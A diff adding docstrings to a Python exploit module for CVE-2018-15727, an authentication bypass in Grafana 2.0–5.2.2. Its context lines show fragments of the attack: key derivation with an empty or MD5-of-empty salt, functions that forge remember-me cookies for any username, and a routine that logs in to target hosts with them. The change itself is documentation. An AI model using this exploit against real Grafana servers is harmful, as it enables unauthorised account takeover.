@@ -1,6 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+"""
+Grafana 2.0-5.2.2 authentication bypass exploit module (CVE-2018-15727).
+
+This module exploits a vulnerability in Grafana's remember me cookie
+generation for LDAP and OAuth authentication. Due to improper seeding,
+it's possible to craft valid remember me cookies for any username.
+"""
+
 # standard modules
 import binascii
 import hashlib
@@ -55,6 +63,17 @@ metadata = {
 
 
 def encrypt_version5(username):
+    """
+    Encrypt a username into a Grafana 5.x remember me cookie.
+
+    Exploits the weak seeding in Grafana 5.x cookie generation.
+
+    Args:
+        username: Username to encrypt into cookie
+
+    Returns:
+        Hex-encoded cookie string (nonce + ciphertext)
+    """
     salt = b''
     iterations = 1000
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
@@ -68,6 +87,17 @@ def encrypt_version5(username):
 
 
 def encrypt_version4(username):
+    """
+    Encrypt a username into a Grafana 2.x-4.x remember me cookie.
+
+    Exploits the weak seeding in Grafana 2.x-4.x cookie generation.
+
+    Args:
+        username: Username to encrypt into cookie
+
+    Returns:
+        Hex-encoded cookie string (nonce + ciphertext)
+    """
     salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
     iterations = 1000
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
@@ -81,6 +111,15 @@ def encrypt_version4(username):
 
 
 def decrypt_version5(cookie):
+    """
+    Decrypt a Grafana 5.x remember me cookie to extract username.
+
+    Args:
+        cookie: Hex-encoded cookie string
+
+    Returns:
+        Decrypted username string
+    """
     salt = b''
     iterations = 1000
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
@@ -92,6 +131,15 @@ def decrypt_version5(cookie):
 
 
 def decrypt_version4(cookie):
+    """
+    Decrypt a Grafana 2.x-4.x remember me cookie to extract username.
+
+    Args:
+        cookie: Hex-encoded cookie string
+
+    Returns:
+        Decrypted username string
+    """
     salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
     iterations = 1000
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
@@ -103,6 +151,18 @@ def decrypt_version4(cookie):
 
 
 def run(args):
+    """
+    Execute the Grafana authentication bypass exploit.
+
+    This function generates or decrypts Grafana remember me cookies and
+    attempts to authenticate to the target using the crafted cookies.
+
+    Args:
+        args: Dictionary containing module options (VERSION, USERNAME, RHOSTS, etc.)
+
+    Returns:
+        None
+    """
     if dependencies_requests_missing:
         logging.error('Module dependency (requests) is missing, cannot continue')
         return
